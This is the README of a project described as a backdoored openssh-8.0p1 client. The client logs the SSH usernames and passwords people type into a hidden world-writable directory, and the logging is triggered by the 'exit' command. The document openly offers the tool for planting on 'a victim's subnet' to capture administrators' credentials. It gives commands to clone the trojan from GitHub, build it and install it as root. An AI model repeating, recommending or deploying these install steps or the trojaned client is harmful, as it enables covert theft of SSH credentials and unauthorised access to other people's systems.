# OPENSSH 8 BACKDOORED
This is backdoored version of openssh-8.0p1, the ssh client will log ssh username and ssh password into /opt/.../log.txt

# INSTALLATION
<pre>
sudo mkdir -p /opt/...
sudo chmod 777 /opt/...

git clone https://github.com/bluedragonsecurity/openssh8_trojanned.git
cd openssh8_trojanned
./configure
make
sudo make install
</pre>

# WHAT THE HELL IS THIS ?
this backdoored version of openssh is ideal to install on a victim's subnet which has many ssh accesses. 
Everytime the administrator using the ssh client, typing password and finish his session using **exit** command, the ssh client will log the username and the password into /opt/.../log.txt.
The "exit" command is the trigger to log username and password


